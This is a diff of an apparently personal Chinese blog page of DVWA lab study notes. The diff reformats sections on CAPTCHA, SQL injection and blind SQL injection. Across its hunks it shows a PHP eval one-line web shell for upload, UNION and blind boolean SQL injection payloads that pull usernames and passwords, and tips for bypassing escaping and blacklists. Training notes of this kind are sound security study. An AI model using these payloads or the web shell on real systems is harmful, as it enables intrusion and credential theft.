@@ -86,7 +86,7 @@
 <meta property="og:site_name" content="从零开始的Kae">
 <meta property="og:description" content="大姐姐就该有大姐姐的亚子">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-07-31T15:57:23.289Z">
+<meta property="og:updated_time" content="2019-08-01T15:33:19.686Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DVWA差点就把Kae姐姐劝退成功了！">
 <meta name="twitter:description" content="大姐姐就该有大姐姐的亚子">
@@ -385,7 +385,7 @@
 </ul>
 <p><strong>漏洞防范及修复：</strong><br>要求输入原始密码+token+session cookie</p>
 <h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>对于php来说，常见的文件包含函数有如下：<br>1.include()<br>2.include_once()<br>3.require()<br>4.require_once()<br>5.file_open()</p>
-<p><strong>测试文件上传的方法</strong>后缀分别为php和txt分别上传<br>黑名单限制一般采取双写方法绕过<br>白名单例如file<em>限制采取file://协议访问*</em>本地**计算机中的文件</p>
+<p><strong>测试文件上传的方法</strong>后缀分别为php和txt分别上传<br>黑名单限制一般采取双写方法绕过<br>白名单例如file限制采取file://协议访问<strong>本地</strong>计算机中的文件</p>
 <p><strong>防范方法：</strong>白名单做更严格的限制，限制具体到文件名</p>
 <h3 id="File-Update-文件上传"><a href="#File-Update-文件上传" class="headerlink" title="File Update 文件上传"></a>File Update 文件上传</h3><p><strong>目标：</strong>上传一句话木马getshell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	@eval($_POST[&apos;Kae Y&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -397,22 +397,79 @@
 <h3 id="Insecure-CAPTCHA-（不安全的验证码）"><a href="#Insecure-CAPTCHA-（不安全的验证码）" class="headerlink" title="Insecure CAPTCHA （不安全的验证码）"></a>Insecure CAPTCHA （不安全的验证码）</h3><p>服务器通过调用<strong>recaptcha_check_answer函</strong>数检查用户输入的正确性。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recaptcha_check_answer($privkey,$remoteip, $challenge,$response)</span><br></pre></td></tr></table></figure>
 
-<p>参数<figure class="highlight plain"><figcaption><span>key ，```$remoteip```是用户的ip，```$challenge``` 是recaptcha_challenge_field 字段的值，来自前端页面 ，```$response```是 recaptcha_response_field 字段的值。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">函数返回ReCaptchaResponse class的实例，ReCaptchaResponse 类有2个属性 ：</span><br><span class="line">```$is_valid```是布尔型的，表示校验是否有效，</span><br><span class="line">```$error```是返回的错误代码。</span><br><span class="line">❓</span><br><span class="line">### SQL Injection</span><br><span class="line">**步骤：**</span><br><span class="line"> + 判断是否存在SQL注入（一般用到**‘**），确定数据库poc</span><br><span class="line"> + 确定SQL查询语句中的字段数</span><br><span class="line"> + 确定显示的字段顺粗</span><br><span class="line"> + 获取当前数据库</span><br><span class="line"> + 获取数据库中的表</span><br><span class="line"> + 获取表中的列名</span><br><span class="line"> + 下载数据库</span><br><span class="line"> + 坐牢</span><br><span class="line"> </span><br><span class="line"> 查询**当前数据库**常用语句：</span><br></pre></td></tr></table></figure></p>
-<p> 1’ union select 1,database()#<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询DVWA数据库中的**表**：</span><br></pre></td></tr></table></figure></p>
-<p> 1’ union select 1,table_name from information_schena.tables where table_name=’dvwa’#<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询表中的**列**：</span><br></pre></td></tr></table></figure></p>
-<p> 1‘ union select 1,column_name from information_schema.columns where table_name =’users‘#<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询表中**列的值**：</span><br></pre></td></tr></table></figure></p>
-<p>  1’ union select 1,concat(user,password) from users#<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```mysql_real_escape_string```函数是实现转义 SQL 语句字符串中的特殊字符，如输入单引号’则处理时会在其前面加上右斜杠\来进行转义，如果语句错误则输出相应的错误信息。其中受影响的字符如下：</span><br></pre></td></tr></table></figure></p>
-<p>\x00  \n  \r  \ ‘  “  \x1a</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">针对```mysql_real_escape_string```函数解决语句：</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参数$privkey是服务器申请的private key ，</span><br><span class="line">$remoteip是用户的ip，</span><br><span class="line">$challenge 是recaptcha_challenge_field 字段的值，</span><br><span class="line">来自前端页面 ，</span><br><span class="line">$response`是 recaptcha_response_field 字段的值。</span><br></pre></td></tr></table></figure>
 
-<p>id=2 union select 1,table_name from information_schema.tables wheretable_schema=(select database())#&amp;Submit=Submit</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">除此之外可以通过十六进制进行绕过：</span><br></pre></td></tr></table></figure>
+<p>函数返回ReCaptchaResponse class的实例，ReCaptchaResponse 类有2个属性 ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$is_valid是布尔型的，</span><br><span class="line">表示校验是否有效，</span><br><span class="line">$error</span><br><span class="line">是返回的错误代码。</span><br><span class="line"></span><br><span class="line">❓</span><br></pre></td></tr></table></figure>
 
-<p>id=2 union select 1,column_name from information_schema.columns where table_name=0x7573657273#&amp;Submit=Subumit</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### SQL Injection (Blind)盲注</span><br><span class="line">+ 不显示数据库内建的报错信息</span><br><span class="line">	- 内建的报错信息帮助开发人员发现和修复问题</span><br><span class="line">	- 报错信息提供关于系统的大量的有用信息</span><br><span class="line">+ 当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，也即是盲</span><br><span class="line">+ 思路：既然无法给予报错信息判断结果，基于逻辑真假的不用结果来判断</span><br><span class="line">	- 1&apos; and 1=1 --+</span><br><span class="line">	- 1&apos; and 1=2 --+&apos;</span><br><span class="line"></span><br><span class="line">**步骤：**</span><br><span class="line">**布尔盲注：**</span><br><span class="line">+ 判断是否存在注入，注入字符型还是数字型</span><br><span class="line">	- 1&apos; and 1=1#</span><br><span class="line">	- 1&apos; and 1=2#</span><br><span class="line">+ 猜解当前 数据库名 </span><br><span class="line">	- **猜测数据库名长度：**</span><br><span class="line">	``` 1&apos;and length(database())=**数字n**</span><br></pre></td></tr></table></figure>
+<h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p><strong>步骤：</strong></p>
+<ul>
+<li><p>判断是否存在SQL注入（一般用到<strong>‘</strong>），确定数据库poc</p>
+</li>
+<li><p>确定SQL查询语句中的字段数</p>
+</li>
+<li><p>确定显示的字段顺粗</p>
+</li>
+<li><p>获取当前数据库</p>
+</li>
+<li><p>获取数据库中的表</p>
+</li>
+<li><p>获取表中的列名</p>
+</li>
+<li><p>下载数据库</p>
+</li>
+<li><p>坐牢</p>
+<p>查询<strong>当前数据库</strong>常用语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,database()#</span><br></pre></td></tr></table></figure>
 
-<pre><code>-  **用二分法猜数据库名字**
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and ascii(substr(database(),1,1))&gt; 97#</span><br><span class="line">substr(string,int1,int2)</span><br><span class="line">string需要截取的字符串</span><br><span class="line">int1截取字符串的开始位置（0和1都是从第一个卫视开始截取）</span><br><span class="line">b截取的长度</span><br></pre></td></tr></table></figure></code></pre><ul>
+<p>查询DVWA数据库中的<strong>表</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ union select 1,table_name from information_schena.tables where table_name=&apos;dvwa&apos;#</span><br></pre></td></tr></table></figure>
+
+<p>查询表中的<strong>列</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1‘ union select 1,column_name from information_schema.columns where table_name =’users‘#</span><br></pre></td></tr></table></figure>
+
+<p>查询表中<strong>列的值</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,concat(user,password) from users#</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>mysql_real_escape_string函数是实现转义 SQL 语句字符串中的特殊字符，如输入单引号’则处理时会在其前面加上右斜杠\来进行转义，如果语句错误则输出相应的错误信息。其中受影响的字符如下：<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\x00  </span><br><span class="line">\n  </span><br><span class="line">\r  </span><br><span class="line">\ </span><br><span class="line">&apos;  </span><br><span class="line">&quot;  </span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure></p>
+<p>针对mysql_real_escape_string函数解决语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2 union select 1,table_name from information_schema.tables wheretable_schema=(select database())#&amp;Submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p>除此之外可以通过十六进制进行绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2 union select 1,column_name from information_schema.columns where table_name=0x7573657273#&amp;Submit=Subumit</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQL-Injection-Blind-盲注"><a href="#SQL-Injection-Blind-盲注" class="headerlink" title="SQL Injection (Blind)盲注"></a>SQL Injection (Blind)盲注</h3><ul>
+<li>不显示数据库内建的报错信息<ul>
+<li>内建的报错信息帮助开发人员发现和修复问题</li>
+<li>报错信息提供关于系统的大量的有用信息</li>
+</ul>
+</li>
+<li>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，也即是盲</li>
+<li>思路：既然无法给予报错信息判断结果，基于逻辑真假的不用结果来判断<ul>
+<li>1’ and 1=1 –+</li>
+<li>1’ and 1=2 –+’</li>
+</ul>
+</li>
+</ul>
+<p><strong>步骤：</strong><br><strong>布尔盲注：</strong></p>
+<ul>
+<li><p>判断是否存在注入，注入字符型还是数字型</p>
+<ul>
+<li>1’ and 1=1#</li>
+<li>1’ and 1=2#</li>
+</ul>
+</li>
+<li><p>猜解当前 数据库名 </p>
+<ul>
+<li><p><strong>猜测数据库名长度：</strong>1’and length(database())=数字<strong>n</strong></p>
+</li>
+<li><p><strong>用二分法猜数据库名字</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and ascii(substr(database(),1,1))&gt; 97#</span><br><span class="line">substr(string,int1,int2)</span><br><span class="line">string需要截取的字符串</span><br><span class="line">int1截取字符串的开始位置（0和1都是从第一个卫视开始截取）</span><br><span class="line">b截取的长度</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
 <li><p>猜解数据库中的表名</p>
 <ul>
 <li>猜测数据库中表的个数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and ( select count(table_name) from information_schema.tables where table_schema=database())=1</span><br></pre></td></tr></table></figure>
@@ -430,7 +487,7 @@
 
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//猜测字段长度</span><br><span class="line">1&apos; and length(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1)=1</span><br></pre></td></tr></table></figure>
 
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//cao</span><br></pre></td></tr></table></figure>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>猜解数据</p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//猜数据</span><br></pre></td></tr></table></figure>
@@ -615,7 +672,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#大姐姐就该有大姐姐的亚子"><span class="nav-number">1.</span> <span class="nav-text">大姐姐就该有大姐姐的亚子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA"><span class="nav-number">2.</span> <span class="nav-text">DVWA</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Brute-Force"><span class="nav-number">2.1.</span> <span class="nav-text">Brute Force</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Command-Injection"><span class="nav-number">2.2.</span> <span class="nav-text">Command Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF（跨站请求伪造）"><span class="nav-number">2.3.</span> <span class="nav-text">CSRF（跨站请求伪造）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Inclusion"><span class="nav-number">2.4.</span> <span class="nav-text">File Inclusion</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Update-文件上传"><span class="nav-number">2.5.</span> <span class="nav-text">File Update 文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Insecure-CAPTCHA-（不安全的验证码）"><span class="nav-number">2.6.</span> <span class="nav-text">Insecure CAPTCHA （不安全的验证码）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Weak-Session-IDs"><span class="nav-number">2.7.</span> <span class="nav-text">Weak Session IDs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS（DOM）"><span class="nav-number">2.8.</span> <span class="nav-text">XSS（DOM）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSP-Bypass-内容安全策略绕过"><span class="nav-number">2.9.</span> <span class="nav-text">CSP Bypass  内容安全策略绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java-Script-Attacks-JS攻击"><span class="nav-number">2.10.</span> <span class="nav-text">Java Script Attacks JS攻击</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#大姐姐就该有大姐姐的亚子"><span class="nav-number">1.</span> <span class="nav-text">大姐姐就该有大姐姐的亚子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA"><span class="nav-number">2.</span> <span class="nav-text">DVWA</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Brute-Force"><span class="nav-number">2.1.</span> <span class="nav-text">Brute Force</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Command-Injection"><span class="nav-number">2.2.</span> <span class="nav-text">Command Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF（跨站请求伪造）"><span class="nav-number">2.3.</span> <span class="nav-text">CSRF（跨站请求伪造）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Inclusion"><span class="nav-number">2.4.</span> <span class="nav-text">File Inclusion</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Update-文件上传"><span class="nav-number">2.5.</span> <span class="nav-text">File Update 文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Insecure-CAPTCHA-（不安全的验证码）"><span class="nav-number">2.6.</span> <span class="nav-text">Insecure CAPTCHA （不安全的验证码）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-Injection"><span class="nav-number">2.7.</span> <span class="nav-text">SQL Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-Injection-Blind-盲注"><span class="nav-number">2.8.</span> <span class="nav-text">SQL Injection (Blind)盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Weak-Session-IDs"><span class="nav-number">2.9.</span> <span class="nav-text">Weak Session IDs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS（DOM）"><span class="nav-number">2.10.</span> <span class="nav-text">XSS（DOM）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSP-Bypass-内容安全策略绕过"><span class="nav-number">2.11.</span> <span class="nav-text">CSP Bypass  内容安全策略绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java-Script-Attacks-JS攻击"><span class="nav-number">2.12.</span> <span class="nav-text">Java Script Attacks JS攻击</span></a></li></ol></li></ol></div>
             
 
           </div>
